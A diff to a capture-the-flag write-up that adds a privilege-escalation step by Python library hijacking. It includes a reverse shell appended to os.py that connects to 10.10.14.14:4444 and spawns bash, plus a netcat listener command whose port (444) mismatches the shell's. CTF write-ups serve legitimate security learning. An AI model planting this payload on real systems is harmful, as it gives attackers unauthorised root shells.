@@ -323,11 +323,29 @@ db_name=FZ
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4be0605e-d48e-4b27-b7aa-1f6d6355f4c7)
 
++ Add the python reverse shell code to the bottom of the os.py file.
++ Remove **os** from **os.dup2()**, and just write **dup2()** since we're in the os module.
++ Check [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) about more.
 
+```
+#!/usr/bin/python
+import socket
+import subprocess
 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.14",4444))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"]);
+```
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e2c438c4-2d5e-483e-827a-09978ffa7f41)
 
++ Start a netcat listener on the attack machine: `nc -lnvp 444`
++ Wait 2 minutes until to get the root shell.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f1117a6-c15f-4b48-be4e-9782a51c2919)
 
 
 # References & Alternatives
